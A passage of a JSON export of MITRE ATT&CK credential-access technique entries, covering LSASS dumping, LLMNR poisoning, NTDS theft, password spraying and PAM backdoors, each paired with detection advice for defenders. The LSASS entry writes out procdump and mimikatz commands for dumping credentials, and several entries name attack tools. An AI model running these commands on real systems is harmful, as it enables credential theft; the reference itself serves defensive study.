credentials.<\/p>\n<p>To manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault. (Citation: External to DA, the OS X Way) By default, the passphrase for the keychain is the user\u2019s logon credentials.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Unlocking the keychain and using passwords from it is a very common process, so there is likely to be a lot of noise in any detection technique. Monitoring of system calls to the keychain can help determine if there is a suspicious process trying to access it.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":636,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":640,"name":"T1557.001 - LLMNR\/NBT-NS Poisoning and SMB Relay","sort_id":0,"external_id":"T1557.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>By responding to LLMNR\/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. <\/p>\n<p>Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)<\/p>\n<p>Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)\/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification\/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1040\">Network Sniffing<\/a> and crack the hashes offline through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1110\">Brute Force<\/a> to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)<\/p>\n<p>Several tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and <a href=\"https:\/\/attack.mitre.org\/software\/S0174\">Responder<\/a>. (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor <code>HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient<\/code> for changes to the \"EnableMulticast\" DWORD value. A value of \u201c0\u201d indicates LLMNR is disabled. (Citation: Sternsecurity LLMNR-NBTNS)\n\nMonitor for traffic on ports UDP 5355 and UDP 137 if LLMNR\/NetBIOS is disabled by security policy.\n\nDeploy an LLMNR\/NBT-NS spoofing detection tool.(Citation: GitHub Conveigh) Monitoring of Windows event logs for event IDs 4697 and 7045 may help in detecting successful relay techniques.(Citation: Secure Ideas SMB Relay)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":640,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":641,"name":"T1003.004 - LSA Secrets","sort_id":0,"external_id":"T1003.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets<\/code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)<\/p>\n<p><a href=\"https:\/\/attack.mitre.org\/software\/S0075\">Reg<\/a> can be used to extract from the Registry. <a href=\"https:\/\/attack.mitre.org\/software\/S0002\">Mimikatz<\/a> can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":641,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":643,"name":"T1003.001 - LSASS Memory","sort_id":0,"external_id":"T1003.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct <a href=\"https:\/\/attack.mitre.org\/tactics\/TA0008\">Lateral Movement<\/a> using <a href=\"https:\/\/attack.mitre.org\/techniques\/T1550\">Use Alternate Authentication Material<\/a>.<\/p>\n<p>As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.<\/p>\n<p>For example, on the target host use procdump:<\/p>\n<ul>\n<li><code>procdump -ma lsass.exe lsass_dump<\/code><\/li>\n<\/ul>\n<p>Locally, mimikatz can be run using:<\/p>\n<ul>\n<li><code>sekurlsa::Minidump lsassdump.dmp<\/code><\/li>\n<li><code>sekurlsa::logonPasswords<\/code><\/li>\n<\/ul>\n<p>Windows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages<\/code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages<\/code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)<\/p>\n<p>The following SSPs can be used to access credentials:<\/p>\n<ul>\n<li>Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.<\/li>\n<li>Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)<\/li>\n<li>Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.<\/li>\n<li>CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)<\/li>\n<\/ul>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for unexpected processes interacting with LSASS.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https:\/\/attack.mitre.org\/techniques\/T1055) to reduce potential indicators of malicious activity.\n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":643,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":663,"name":"T1557 - Man-in-the-Middle","sort_id":0,"external_id":"T1557","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may attempt to position themselves between two or more networked devices using a man-in-the-middle (MiTM) technique to support follow-on behaviors such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1040\">Network Sniffing<\/a> or <a href=\"https:\/\/attack.mitre.org\/techniques\/T1565\/002\">Transmitted Data Manipulation<\/a>. By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)<\/p>\n<p>Adversaries may leverage the MiTM position to attempt to modify traffic, such as in <a href=\"https:\/\/attack.mitre.org\/techniques\/T1565\/002\">Transmitted Data Manipulation<\/a>. Adversaries can also stop traffic from flowing to the appropriate destination, causing denial of service.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor network traffic for anomalies associated with known MiTM behavior. Consider monitoring for modifications to system configuration files involved in shaping network traffic flow.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":663,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":663,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":663,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":666,"name":"T1556 - Modify Authentication Process","sort_id":0,"external_id":"T1556","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows or pluggable authentication modules (PAM) on Unix-based systems, responsible for gathering, storing, and validating credentials. <\/p>\n<p>Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for new, unfamiliar DLL files written to a domain controller and\/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages<\/code>) and correlate then investigate the DLL files these files reference. \n\nPassword filters will also show up as an autorun and loaded DLL in lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)\n\nMonitor for calls to <code>OpenProcess<\/code> that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).(Citation: Dell Skeleton) \n\nMonitor PAM configuration and module paths (ex: <code>\/etc\/pam.d\/<\/code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.\n\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services. (Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":666,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":666,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":666,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":671,"name":"T1003.003 - NTDS","sort_id":0,"external_id":"T1003.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\NTDS\\Ntds.dit<\/code> of a domain controller.(Citation: Wikipedia Active Directory)<\/p>\n<p>In addition to looking NTDS files on active Domain Controllers, attackers may search for backups that contain the same or similar information.(Citation: Metcalf 2015)<\/p>\n<p>The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.<\/p>\n<ul>\n<li>Volume Shadow Copy<\/li>\n<li>secretsdump.py<\/li>\n<li>Using the in-built Windows tool, ntdsutil.exe<\/li>\n<li>Invoke-NinjaCopy<\/li>\n<\/ul>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NTDS.dit.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":671,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":689,"name":"T1110.002 - Password Cracking","sort_id":0,"external_id":"T1110.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. <a href=\"https:\/\/attack.mitre.org\/techniques\/T1003\">OS Credential Dumping<\/a> is used to obtain password hashes, this may only get an adversary so far when <a href=\"https:\/\/attack.mitre.org\/techniques\/T1550\/002\">Pass the Hash<\/a> is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.(Citation: Wikipedia Password cracking) The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network. Consider focusing efforts on detecting other adversary behavior used to acquire credential materials, such as [OS Credential Dumping](https:\/\/attack.mitre.org\/techniques\/T1003) or [Kerberoasting](https:\/\/attack.mitre.org\/techniques\/T1558\/003).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":689,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":689,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":689,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":689,"platform_id":4,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":689,"platform_id":5,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":690,"name":"T1556.002 - Password Filter DLL","sort_id":0,"external_id":"T1556.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. <\/p>\n<p>Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and\/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. <\/p>\n<p>Adversaries can register malicious password filters to harvest credentials from local computers and\/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for new, unfamiliar DLL files written to a domain controller and\/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages<\/code>) and correlate then investigate the DLL files these files reference.\n\nPassword filters will also show up as an autorun and loaded DLL in lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":690,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":691,"name":"T1110.001 - Password Guessing","sort_id":0,"external_id":"T1110.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.<\/p>\n<p>Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)<\/p>\n<p>Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:<\/p>\n<ul>\n<li>SSH (22\/TCP)<\/li>\n<li>Telnet (23\/TCP)<\/li>\n<li>FTP (21\/TCP)<\/li>\n<li>NetBIOS \/ SMB \/ Samba (139\/TCP &amp; 445\/TCP)<\/li>\n<li>LDAP (389\/TCP)<\/li>\n<li>Kerberos (88\/TCP)<\/li>\n<li>RDP \/ Terminal Services (3389\/TCP)<\/li>\n<li>HTTP\/HTTP Management Services (80\/TCP &amp; 443\/TCP)<\/li>\n<li>MSSQL (1433\/TCP)<\/li>\n<li>Oracle (1521\/TCP)<\/li>\n<li>MySQL (3306\/TCP)<\/li>\n<li>VNC (5900\/TCP)<\/li>\n<\/ul>\n<p>In addition to management services, adversaries may &quot;target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,&quot; as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)<\/p>\n<p>In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows &quot;logon failure&quot; event ID 4625.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor authentication logs for system and application login failures of [Valid Accounts](https:\/\/attack.mitre.org\/techniques\/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":691,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":691,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":691,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":691,"platform_id":4,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":691,"platform_id":5,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":691,"platform_id":6,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":691,"platform_id":7,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":691,"platform_id":8,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":691,"platform_id":9,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":692,"name":"T1110.003 - Password Spraying","sort_id":0,"external_id":"T1110.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)<\/p>\n<p>Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:<\/p>\n<ul>\n<li>SSH (22\/TCP)<\/li>\n<li>Telnet (23\/TCP)<\/li>\n<li>FTP (21\/TCP)<\/li>\n<li>NetBIOS \/ SMB \/ Samba (139\/TCP &amp; 445\/TCP)<\/li>\n<li>LDAP (389\/TCP)<\/li>\n<li>Kerberos (88\/TCP)<\/li>\n<li>RDP \/ Terminal Services (3389\/TCP)<\/li>\n<li>HTTP\/HTTP Management Services (80\/TCP &amp; 443\/TCP)<\/li>\n<li>MSSQL (1433\/TCP)<\/li>\n<li>Oracle (1521\/TCP)<\/li>\n<li>MySQL (3306\/TCP)<\/li>\n<li>VNC (5900\/TCP)<\/li>\n<\/ul>\n<p>In addition to management services, adversaries may &quot;target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,&quot; as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)<\/p>\n<p>In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows &quot;logon failure&quot; event ID 4625.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor authentication logs for system and application login failures of [Valid Accounts](https:\/\/attack.mitre.org\/techniques\/T1078). Specifically, monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.\n\nConsider the following event IDs:(Citation: Trimarc Detecting Password Spraying)\n\n* Domain Controllers: \"Audit Logon\" (Success & Failure) for event ID 4625.\n* Domain Controllers: \"Audit Kerberos Authentication Service\" (Success & Failure) for event ID 4771.\n* All systems: \"Audit Logon\" (Success & Failure) for event ID 4648.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":692,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":692,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":692,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":692,"platform_id":4,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":692,"platform_id":5,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":692,"platform_id":6,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":692,"platform_id":7,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":692,"platform_id":8,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":692,"platform_id":9,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":698,"name":"T1556.003 - Pluggable Authentication Modules","sort_id":0,"external_id":"T1556.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so<\/code>, which retrieves, sets, and verifies account authentication information in <code>\/etc\/passwd<\/code> and <code>\/etc\/shadow<\/code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)<\/p>\n<p>Adversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so<\/code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)<\/p>\n<p>Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor PAM configuration and module paths (ex: <code>\/etc\/pam.d\/<\/code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.\n\nLook for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":698,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 